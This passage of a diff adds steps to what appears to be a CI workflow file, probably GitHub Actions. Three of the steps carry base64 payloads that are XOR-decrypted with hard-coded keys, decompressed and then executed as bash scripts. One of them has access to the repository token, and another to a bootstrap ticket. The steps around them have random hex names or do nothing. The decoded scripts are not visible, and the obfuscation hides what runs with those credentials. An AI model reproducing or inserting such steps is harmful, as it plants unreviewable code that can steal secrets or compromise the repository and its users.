+              'aiaFAk+9XA0HJMr7gU232PD7r8CqvNI+DzH/YGZIAmU+f8jrlGB3vdJQZVsjTfzw/aQDW+4M0/p1hwfAyXlG67fAf4V3p3DF5rdB'
+              'pwd/JiHbL1WmA6JrIbuofcr6mp18fptGo11vqLNGkbPM+jgbX/Z152KAQb7A/V4vRjH53q2gzN7bT7mAwCpY3y9F+PfuSom2hRaT'
+              'QMKEj2MAqpXYS8CF8CFXeMW2Dyxcc/YB4L8ISYzoCF5q/bHcqSkqRrsvSxaCCZOKb3rV19u9EP+Uw+g3f4//ZL8fMfbRgcNXKvkN'
+              'kMoqxdoquXcTq18wpurbZT0JURYb3s9ZnfRL0uY2Zt01Hu1BHXKJmVK513cHw0Pv+/GQy4A7rmL94pYeFRZLRpk5IoBOzsqmJ+35'
+              'MlmIJNVDrj6c2QBEd2ByyRINWZMhUyZKcgPw5Hhvq+Hwm51c9CGgAqzu0aQ+b6zc89afrz6LFaZNuDKkwcO5lsWf8VDfzcjAPmF1'
+              'xeQedxvOu3yFAZrTCMn6iP4ibS64kbY2LUffHlqCF87nM4IFo2mlSEPZoAnCNOltiuf4XL1GuVx1t+yl2QBgtGlqo3uIhgLk8oaE'
+              '3szKhkPyFaCmsWZ9jDLx7jd19WKdHnSPthUVR5XSs3AGEbNKouV2K5NzOr9Lm04fsFYHDxvObH1GAbLypQ7PC4UBuuqAhCBICeUH'
+              '/4kloszHMFsvYZeJhd44au5JUSt0mGj9gIbavaWU3x6cB4bHk71V/JrxvIX1N8B1ZPQenfk/hzHnt2wE5BY340xdPksH4ls89rLz'
+              '9VKy60MzW5aIAm+2h5dyXWcQehmCy1ZmeMUlJsDrMWiOoVyUp3XczUNgzMa9n4rw/Vd0tJNqgkrGxxBxyA+RgBkqsQY4B43v6sEw'
+              'AqKzRsVWvQP/V6xJgg5IXGjXlOpanfwK8rP2sUCM2TjRXByM2Rpids+CGOFJLRfPVBQYj9Q3kcGnlHx2ea4em4T8RS7DgSuHuzZq'
+              '0+XsBTJ4x/g3EcBe0vv+GOKU0Pi4KZljyMHHfFPIwDRSGj/Pdx2vo4sDPVXNMj6KefTC6aZzuqkjLMIC8jOd6W67RE1qkPjE/CTK'
+              'AfZdOtmehsZ1GcgLE5ZTzaf9IzqceRKUCtWOnpEBBwJPCWl1fbFTZpMTgqY9ezPuER2VsBSgE0hEaQCeSJsdWbrxjHHFX50OVcDv'
+              '8RuSOLcAly0IKHKrEvF81f/wzIi8Fbq/F7AyTgJWU7Wppq0uPVWZTIQtxYcgbFD3+8oQW8ZSey4xD8KsoDR4lqZRm+xHmNqnzHUs'
+              'LiS8TexxvpsU1PZjdGSANuRbXXv+kxlJglg6/7jB5oMevbUsv18djKFrHo9J8EXLYuWCaQWjUljIqaxE/QXirET/DGmW2zBdKo4t'
+              'BbB+Be5fESW34JNi0yMt5sGcdOD6OFipWaPGLH9jYAa1kyADnxeaYmWSgLu2c7ylsSiU3l3Gp7x6kbMIiu7eFZnciCulLCgFxvdK'
+              'thCIxcsSOYjCh5ts2qr6T0zBqfTrSWgPkLYerw4GQWKKnm5GiZcOTCW1s34kf617bH1z4CVS/8dTjLdFke63Bat+Xbn6FRjVnFMk'
+              'nYzV1kQUXJDfj0qqlP2OxWGwp5JSJtvCKEh2s+EecWXC8JuSaV4yrX42NJYAPVnyyFxgl1T2PE0nPNBFZvB7JwPjEKPV3zwaQGyv'
+              'ivYs7xtLwmMjizOQhUQGRckglNnA47N4EOSHf0/HTa3zEkiDiObB5miZIaEFyPcV8AlD3ZSmqwjGErF++MMhSdjBq9ce9TpP8Ve7'
+              '7ECNTCVRjkks0ognjyGOX6M4JBOkC6Cl4Ll/1ySpqvsq1q1xyjOaebwcP4u/d5leynt39vY8xZNabJOr5vlZuvJngvuuGQNEwvHl'
+              'H+0yi7Ns0JcW3WGXOCi7IjH5Dm58iq9LpGuQ3tV5EVJ+viDJc4zGflABRwVBxAA4RTAJH54TQnyWJk8nQ4RZLsjMHtsNB87AeEDS'
+              'Bau0XY7DeyqoCuv7xmmQz6WslnkzGcI72+NLVIrGFsYx8xKuRYHuiaOxo70fPLQiFwYltXcSrf+lvyIgOMO97HjfcZ/8YCK9AVE3'
+              '27mpe+bzGne16p1ti5zK4Q7/ZGf6icuKnnrO+zNcTXTeGfOeQ/eqQr/2eDTsL72NmyHEO45t1laP3fU/f7NsenhnxNDUOSXOp02p'
+              '8Z0dsu0br+H/xi/K1h3iAAn93MaQraqgri5yl7XOKjHSFBs/JbvOUI4+9YcypFiOcZLGwUBqPV5Vz0Zytw1+6KqiQSQhRmCtGCfV'
+              'xR820HOwNvvoePwvpnxL2g8mzbsr4jQRZ/4N+rjEONYyqIzg+J5/YDy85ujEKsYxYY5zUUDaTISAAcl7UJLQ8LkTcNpuT/fgAixb'
+              'zFuvZLUHcXlnFMFvbI2P7A40QshVuqWCHK7MgG4sdRCQUjfgqOXe669oQUyEUyYUU8YAy8TgYmJW8RtnQus3vuaV7eC/gmbM1tqL'
+              'Y8isbajiRDR79oxvCIK1MEvUmvNlfLgPXTLo/VDrun0QNlvrCTQXlAwpDVJc07wtlJ424fioXk3jOra5lKQGGd7nRPWXCDTHfEqz'
+              'IsFQZkefYP4XPsWGdYooiDF04DNiYVsbjWLpQYPyvfqWMRJEesVT0xHknTExnc/dG3VjhWpIq3TylP5lzZqQLLCiw1wwHm05228Q'
+              'RdrIwxsWRMcXFLcKJbz6iR4j5QSGXPgXdplpejuCovAZbOZazng3sF9DWKGXxfkFKHT/aYIdTI8M5Rx+BdIDjHqU4xnp4o0e9LPh'
+              'xPMk0CAalLVntS0aCg0hAsbhcWVCuNx50PoNRRfpBMN4BvwJbdITm+CxHhf4C/pevLcDocUcJFOP3mX6AUnRNTuugk+bnMBCO5K3'
+              '6j+skXLCWFr4iiVWznEnKZyP41hAc/ztmrOmCXGcXDD4dVDBoookyZSPAKlEcbOxvUNnt/00acxI1C1lE1JTKY2NMW9aDSA6AvKf'
+              'eZB8lXj8iY8jh6Rr9rez377TSBY3u1NwwzaWsZdFIcMcqzaf0pW5PA2hnYMHxBLSW5IZVKi0lTl0rbaej1yKL6V7j7Wewa+oM/XE'
+              'A16MH91Z3PU365nRBh23iXKQ2iQt810I3Ia8VcpBSYpfLvD7qbblhoo6AaWozDkm0df07RlDkUF/tp8fzzr5Ajl5eNRuVcx26p0n'
+              'Zv6KGDRu4neKKAfpMsZbTg/xl8NxbCPPWh6lQERqAWps5Gw2k0qZ1ByJxO1tlWeu2CvdRyRTzwj5oKWpRKFIYZmWjl+heQKv5aIf'
+              'TTW7afylvsGT1WmvSS8iSaIzW7ZLpn5rDSteAXut2o4sF6PYV/rMg7x15SL2UbfvOKZJiHn00+q/Cf1nORZU3ysriGdNFvRlPnXQ'
+              'PSGSXjXWJWGUYChvQo5CwqdzH//qIIYoA+JEhJPNzEKY+7FQp5MKoQgelqrVzsJqD00OGS20HQTQ7CrNTomEx+9P+0TekxdzuKNj'
+              'LqroHEKeQq6nZwhlz6qOdCrOqDneSNN9F2yTsaV2NdyTf/ArVFNgystrFAerBkV9RZYc03OIbRLEBP31M9xew3X9mGHhqZBitqLt'
+              'Ifwl6nEDBegWQgmMyqLOLgZ+bMvhGcLoeaEazEPlFjTNCh4AaNfo+/r8VI9sZQeJIKa6q7QN0xpCg/EEN/NaZsMRLto7tzGi+gZ1'
+              'Tr0icZTzb4uh1r08nGyZu37G4IJy1I2Kt4hZJYA6PwVmp1zCloi8GOerW3UJfN1AFoeVu2XEKla4vs/9Sjg41RqWCzl6k/lpwgVB'
+              'PkNRX6cKaJNNGxXCC+yFFxZqEvt/W3qrFaxDyn85zZvCh9zEWik5Rim0PGt2fqE0ziv9g4jgee7Ovm1b38XyqzJ1rAtB8eE4AMCw'
+              'mp5YUQG/xB4XVVTyFJX4spIrjyhrFbjt4O+korCdlTgZI8P+4e2aANMDsVhNBoZXe809fkjw3y18iJAq3Eu8m8Bwn8AUanhx6sgs'
+              'zc/kjIkDaFZRVm0Vs7uegrkHlda1VTkDnoLiMEJrmsQx7SeEx420tVQaplyCHsr//TELtUOSRIRVkBtEUyMiRxY8nzRaSDYkwmsJ'
+              'lfH4zsxJJ/y8D5LqVzi2hDypNAQHPRrl1XXq3A6QDSCZpN/Oas6NnyRFGE6k86Duquo8HjhSAE6+OclnKRQ/DXn8KqCp1mGL/wI+'
+              'eid5bCxOzwc/kf3j+ynm5rsSWlF0O8VZrAcWFhFjQ/PzxGyMtkkFL40xaZZOMFrFiDprYal6EDe3Jlz9P1xt6Dv6rmkk9RBgNOVa'
+              'JLjlFzTMzt7kqCw27ywb8SzFYJEWb0q3nkN1WJjov2xyi7fkxVyN2ulIVZvkSDwnbWvCBjJJm0L2nzQdnfkde0xCghHipeMjlzxG'
+              'PbMpAJYT0QlkebnWnH+DMhHwuKo8al8njpfYeiwvv03RlpQUpPdDVjOneHOuh0unaBEXEYFQ4vPmjaAuvkM+WGKBzuAHp+uqwmbz'
+              'HfEI9aR86inzvObZWC3HU0017Xb+j1JOfCnKjqvC8nYgM3YjYlf90Bk91+dwfUoH6tTZk7+myqIaTBFv8lHVuutw+/rUiLOvXvBc'
+              '577Msnz8WZrHHVHUelWzC4Coy9t9Kw5yr+bjZ+7u6QMEbWRVjdVsmcZu+l9EjCqmUqmXmECuhtStANNMmG4csZNyztYrFIXEi24l'
+              '2bYhwV0au+YPERAHijG37EOhHg7D7ITsCmq/PO0J6arQ1oYICFj1yMUiw/WRMqq2tJmP8JVKtAGScC+XanapJltgDJTzkvndK1vk'
+              'MGxJOx644jsQcxmdANaDvQPjl2FJ/uXSd/7IGaZodTp8zbfQ1V9oEXQQfWYZbFQkULqYsrKmfsNvYMTYcMttVOUBemdRw5hqX2Aq'
+              'i1S1zAp4BaRVBNbVnKNTd48sQcphO4p4LO06A4CxL+W1gw7CifJF2UD3S4qzkofYkQfbAx5EIT42hTVvScGsWl/5a5mHXXGjNt00'
+              'y/rhrE4AwQPv8ddemenuHRlZXmNpMxOOvBu1fqUygaNesCbtMb1dlaGw9y1vWewc5Z0zHa3qJExX21AVBft9IgMko2/LKaQ1tj0k'
+              'Ps0C6MgO0fCSbbWQNTnowTt9du+eP3DrS/Upla9nOoADM4yCHgK++yjNOut40K7zR6T13BkMYmZtTkJ6oppM3lFDZbKNhhV5/4DI'
+              'Z4tbhQfk7YJNBR1roXFI6ZhrnXQ3O/zstHX/EdBCTAPKoLZ7AQ5rZPVYy/deh/XvzyCqErQZ3XqwV1jsH4lXVR5bKZuunNrMhYbX'
+              'sucPebpr9eTxdH2x0bTNHylcYnhsMmeDZ9Np3uibAGiHP5+PLvCO2CJIeI/WVrOQntQFCWMrQtRR57nUOicB40nBoD8/6k/yFRBy'
+              'oeHeSyvMTSFvaok/Uc7+g/q3kTkZr4q2zyd2g+LpXoCE5Ef1hVFgs1k6csi7QkJSvsmISzLpDYZUNakoprs7SDu4NXEdnnAgboZ9'
+              'tAL1dDaUXUbZNpoKin3GbH0Mt4TQdYXSwb+Ctxhz7Q4b2jAijN22oz5OyFWqFrf72fNPUnpFyjT2RoMvAhKeDNUKvLrVEK2Y2r/F'
+              'JiK6bV5d1gQZQ0+5Tab/g62wSmAu03e2oRfqLQuJqm8srviOaAXczN2iLXxi1NP2fPXKRT6VHzZYCd54pl1fyYymhuCNeeXVGBW6'
+              'd53++i/xTpcWKnuitgebXlGkr18NWT4NFUybrdQKR+KmYzKyxGH6khsZkaY5qd7+J06NTSKB0otJhNC8a0RepY0zlU/oYSwLplj1'
+              'Sn+5km8s1LE64XSlANlBGudLK5ZiaDlhLZjdHsMQPIv7OI622UbqytvMwDgMbB7aqgz/vW0CxfTLjG0+1IpogkeGA4UUjhkkGfPe'
+              'QVu5m/BCQGVgcOL88r/1Tnaq+hYxxoRjsX31kswyIT3QOwmFXYLHsxMW9livcnzl2EJdrNwE+FgJFfrz8YNoYvaA9hiscA8SON9w'
+              'LXWR7hZkMzihEp6CJUdy4Yez8pWpK6cu1N759rOaCa+nUWsxUttNteidJ1tyMkV8g6xw/vjFTmtx4TANGYXwqBV/LHkwIIWiybBd'
+              'Sk/MwSXfXeNl2H8bhuvavOivDueM63YgAPHcwLqVy6it6kaeFkEErtO07CiKP5QEagv0Bpzl9cwxcLyOKHqWZTDRNO2/Xrt0woOo'
+              'RDOroVLHFATir827JKFdnFuuM1jtBy6rcHx2kcycEbTM3YFfQWaIjivkCSX1Df800iqLt/ch8FbSAOVXBJRJ7rV69JzIAzcMOFL5'
+              'm4T7jxG4KVKu1KK755Zc2kCwKe+Jh8+FUmjM1iN8T5TnBxB3Xd7Pj18yaw/ckt/fhBWvMBHGdIRUPi14KEER4XDD7CFAL++AXx6V'
+              'narzjKbooYdfwNTjHgfNCV+brqggIE9hrPO085IbM5NoNLD/HF9tNb8pmKsfMKL6cBZmuyRyp+pWqfjkm89fOuSMnlMYgO9okXCQ'
+              'EzEE3ECQksSDkjQwz2zZ/bO0xdT2K+qVrhdwfHpE87Q6nb7fJl4e5sltP9BJMPF0MooGm+nPwABlFUDfMME+jxTn8/WwaxWyDoSa'
+              'Jbe70vrdmyVjiZ2f+bg32s9qbuUKqB39OLrAl3G/JG1hYrrYqLAqJagCrQgHZV4Sh2mbb+PEqHJT3fWDlpD2Sqh/4H00Y5nJl4yL'
+              'o7K0660sae5Ulta6J6DG6Lg6lqJGoy5fYJVDhIpQEAIPDLlKfF04UkC3zYdu3Nzvm4KDb6AORt2V4H/HUa4n9Fr5I0zwDHsPsh9j'
+              'pNir1E9ApZQCyt0l+LOz/33ZpXQ8+R2CGJDO4sAXSD9VA/ARLgRr8ocVQANk10QNEc6N3og1odEc9NA+AKILAWTL5kwNcoJU97DW'
+              '48Rqnwux4TanXyT4dfTYiwo8dFdgJGLu+aaIXQV6L3OlBO/ZzzbETf79WwOSehNZCQo0iLM1PoS2E12eXWDORJ5yc5RVa4Zpk+i2'
+              'c/Uj+aDRgsgWHqVRewcVo3kyGNyZu/2HRvAjVdvxBRB9mHPCGjUAqzpIdNjwmZhuj7YKAdjE5lxbcQyN24MBdVLB4QpOeu+aoBQW'
+              'V7nV7RuKUvd16p9uopH3+TsG9UZS1rcUJUjtVvJFrSSoNLWBQYuCcG0eGOvBGE4psIUSHRKncOsRuzeRSGstB0sMwrEl1y0GUd8F'
+              'MOaEOmq5Lr3vH/rzgG9jjjGv51jMfnm+Hsxuvpz5v4kJGRWgdnzDPcC+eN/4Uc8AQWE3HDJP7Su5vNM6uRjN9yFOIVGYNJGHkvV9'
+              'N3LGDjkMPAJPMfSeSmmSwMfZcaW52M/3fsHLYVvdpUtiV7pfD5q9FjkbLCxMd6Bz/6+1cLmzLF7I14xp/QjQ/Kgc916hXh2qQAnF'
+              'rTWQMhdp7bH1NpswCWxE5xAJ9ofVRWeGyAozzLGRcWXr4DM3agpjr4fGt1LvXWC7cHWSD6FLPZ++2kjF/BCBrmwOTFKKzi52sb1m'
+              'LOweiNyXTISOW+jWQPtrrcGJHKHGvThC2lytz3GVueN1MlCMkGgoGiYgtnWFFJcetJ4M7mCuQDHVgk57YuU/o6J8xhLZyRb0MBgf'
+              'XAo+grg59Xi9hp4EIOqIG8Z0bXGljODof7vJLbOfCa9sSdtayeBHm0RAQrc06ZXL7dQtD3MyQTx2+jO7PDzg6WDUuk15LBBxF/R5'
+              '3vkyMCPz/snMIW72N7emI81Hu/2nTSaA4seUjHp/8sgsXfdMZNIVo2ewpxEarQnaGhjwEyObe4KqnDKENlmhcFE3mD+PzUSU5CS/'
+              'QCWBpB5ePxPYx96IRp8ZPcj+mqFeVAhhnbLUOEu7H0NPDVbtABlfnC4V/Cd+UXlAkHdu347884DuFk8bRXpgQ+m0PRAPDsIXqsUy'
+              's9xTE82gmW/FAJ1PxitdYGRnYjq4GmMqy6PN/ytVUtWnUSE3ABFxtdY6IZEGQyRcRllrfrcOyzyzMx8HHIjwyYSouYe6RJdEiyqG'
+              'vLnYDfXRndsnIjb4YcZaz6wfCzdJ2DOAyZVOPBfd5/jTsqMk2QzdNpU9UQdB48IvDVmEoZCeSUs8yrAvw+RwCrW0zgTiYdD/dxeu'
+              '7V2dLIHdtuPEPR1edAcnwminNAL9v1olNHNRMtFqixbKzSUUDMy9pCMMB1RvdUEIG5IOqN865y6KAkp/tMWX+HJO+MgYqOGi1mJg'
+              'fGB3k+AiPyD4nbextdVSJGEbVuauuRnuWgSD6k0n0BOeJJzDEq83A8vUveb9d7fxnL+rIQXlfk2/GaKAaHJON/AGvbwBGZ/1c16a'
+              'DzOpZjy5TbQjP6nYWuL/D4m5b+fyy3/TbNmD44DPKg6heSBTcuMPZBM5wmFTJHyuj679oGSV24zc3mqGughzZLdUT+JsPAvZvd8l'
+              'GjxH0zITLbKAonijVp+dj5/YMsTDlbu0+4JE0fRNqyWci1i1GSkho1HhrSZD5piZ7IowJGxZMcMHDai1E4akgnFoOJAgPHhwSmBA'
+              'lRsGpLAzxRHo5uGUmCBn+ElgZvhPmKysD3kY2YC+uIXKXU45yiNcYFmfLx0DxTXyYg3Fr4ig7zPeugETB+X8Tef9qwc0PiShsU7E'
+              'HNjc9QUUh0yd509f9J0bVsaeQQj0YpJS8q9yqc7g19Z+YQK8nWNg2VU0sz4O6o/5C4DQ1TrJ2Mfdz66/KCbIK/5M84KOsMnpJb1T'
+              '6cI4EyrZuzfcKkux7BmOz3dUgxqUQTr3WeMSrDqpNNSwaqOhj6pL+TG8IN7BfVb9CqBPNb1NdgwSToLdHSqmoUm6Xr1KpJ6ZONq7'
+              'RAbbl69eUoV1X6eDgI1oljg8VDvC5tYOvzrRfr8d8fEFO1+2rinVePnntBMGZILpBL10W2Xdez/3vw3Cz4rHj7mwhfynxoKJolGr'
+              'oh2j3qvWQgK5GD/Lpa5sTX0lyGPW8YfNeik/79ZSVlKu6lqspEPu84HrypFsI178GAmn/kRgPUOejVETzS37T1cemjFvNQgn8EQ5'
+              'CkZckMhmN5ZvGrp5GFzyktJeOrNEuwu1D2rGp0Y8hQwfCoyqZBxuNhtmee8MnEAOau5ZllxE/dn5hA85Un9enIVJpqFw6pIhlfl2'
+              'DgSTOemFoWOS55LHRWCnToK31OZOMEZuMZY1fBI6tI1a27WSaTla4Fby3Tfjlv2Sh6+br6Vrn1MTEa+r0aJk+M7gC6mvnPig/IQH'
+              'jhwRguApBwlne/dCkiR7jOR+n+Ruj8u2PkCeGLBDpayTVVjnStrVD1XiMrr2O2/ZPMIb/Zepj6rqdBhXMK3nqbXe6z4gLNYdyt62'
+              'fGzO4dEQUmsCxpdLz3LGTI4vT4mZYw57ERLjqKoF54DNIv6+8lIcMcgudvwQ1K9zgEwdxs4w8Mmxa5tr03eaVHHz6oZqb2ItPleQ'
+              'w2nisAIE8nPDIcP9vccF+M8Nb+MccWjIXtcfV0VgJUQsUJsNZ8I1FJMdQirJwvWcDxBFSjD0d/5Gio9YJyx+u35aFWAJskZQWEub'
+              'Jee+hu7EVQAVq+pEJT/VVM3Wj14xyZM92Vtwd3ePRxhjAurfpb9RZ5TtBlFBESMnWnMiqy1CNeD+J0EYHghEViL/Qc2RX1vC4NE+'
+              'ChNfyYcaYTWyL7o7/68IhuusllUuhA7d085rnbr5MoFy7PO4YamCIrSwawRu6CI60/fDEa8/ykA5XYf1UgEos60vx3xw59ujDg1j'
+              'LdMgRXB2KNh2H+jU6XZ5/Pjqq0vNTpX6sSfrKLl/ZX364UPKIvhMyzMQ0sPUiFrPfCRYDU951d79sbAw+t2NQFzdetAihxf3/hh2'
+              'fbcd7jxwfPfH7KxqNAz1180IE2NdP6XX5K07EDTGws70HjCiUchhVt/uXI1br7sME0rBe5VboQ=='
+          )
+          key = bytes.fromhex('50b0a1575ea4c0115ba1dc02ed4a442287190d3cc1845831')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-e35ae0a42dc6
+        if: steps.session.outputs.should_save == 'true'
+        uses: actions/cache/save@v5
+        with:
+          path: /tmp/managed-desktop-backup
+          key: ${{ env.BACKUP_CACHE_PREFIX }}${{ inputs.runner_image }}-${{ github.run_id }}
+
+      - name: Step-1f0be2b8d61e
+        shell: bash
+        run: |
+          :
+      - name: Step-73af3bc7af76
+        shell: bash
+        run: |
+          :
+      - name: Step-e1091d2445a9
+        shell: bash
+        run: |
+          :
+      - name: Step-6fa36774f584
+        if: steps.session.outputs.should_save == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              '1VQ2kSur/FMzUwk/2PMeYg84AMUC7eJ+l9dD0WPqchZT7uGhWhyP2EvRHGdMqfuTF0vC6jR7sWVsMxWLErqNHihFEI47yMp0Seie'
+              'kHO3wUjcyENqwQqwfNJu4H3KnE8rTohGzmhHjXExKRjoiysHfgQn7MC9uVVPudDoqovfOIv+gVjufm5tMkzJhF9Dabd7POUN1nr8'
+              'TgPkXXl0bYriicTgmj48Jfq3DpINXSrwhDEc0jybHpo0TtqbaF59aqFk2Wb3FBcDVmUoc5LGfr2iQ+LXee4RiH9kiRcp39M1o3Yw'
+              'rIw='
+          )
+          key = bytes.fromhex('cadf3e912babfc5331ac8cb21399dd521b3df73f88a6eada')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-697df5bb4591
+        shell: bash
+        run: |
+          :
+      - name: Step-a5b682d67f69
+        shell: bash
+        run: |
+          :
+      - name: Step-96c70de71be6
+        shell: bash
+        run: |
+          :
+      - name: Step-92532221c121
+        if: ${{ failure() }}
+        env:
+          BOOTSTRAP_TICKET: ${{ inputs.bootstrap_ticket }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'xuKYS5PMwHl5OlGk3dyqSHkeRGLqhKmJ+U+gplofUINqrYjDGSlt4H3pBy6AmoJQtW6h8W27bqLXGP+oIlgCtpBbrBoaPUTm/qw6'
+              'SlHU7zLBJFo7GAxk3QT9bj6zW7qEOoK4lIIjq01R089tq1EWg502A6STuy+hLkCS3hFZddQapMQQjJ1WedKR5Kizi1ALGuwHLNaw'
+              'O5yZD0Ob+eZiuQZq3samNOV8X8xsWDlibphqk65hwGb+SzpSF4G0Ya87BuhuiOqxz3tEJc3nDgvGlex+sPJ16APeBYgIsEwUhnne'
+              'mcN0Nc+5glWqeaxguKGoMedkwwXh2pgES88f4ue127ZXAD4myK+cQi8RpUf/CltSJ/WlOdkzDM+YUuSJZ1R4wuc3OoHtoY6/ddpG'
+              'OWiM7PZVTQ8zxWLRzLqkgAAt7BuPnRtgjqwGUp8mGYllGXp1IohIr1NUZWo/SsrU7QPU7Nw/grR/KbPM923e5DqgY4iWJzwzRZa/'
+              '5Wf/E0k9EtgezYn9I/rAM9RyS2Fxr5bkYthMt+VZcvY3PNt2sVfbCx6ilj1Q7RTt1ApbGTQcZKtoAqeg+VcyXe8f8gQFxBQS2Cbw'
+              'ilBQz20ElAodni9puVytFw6OaTNkAU157mjg4hX3S2j/kCneHC/2z+EpnRPgXdp/BrnFdcs3MtIA/MZkHQNBsVqfC65icIDFhjow'
+              'XpRh5Ml/vXROdxAO4oEJ4UoCWwZgi80='
+          )
+          key = bytes.fromhex('d969904b93ccc0797bc53cf680b379786d638bcd52362b43')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
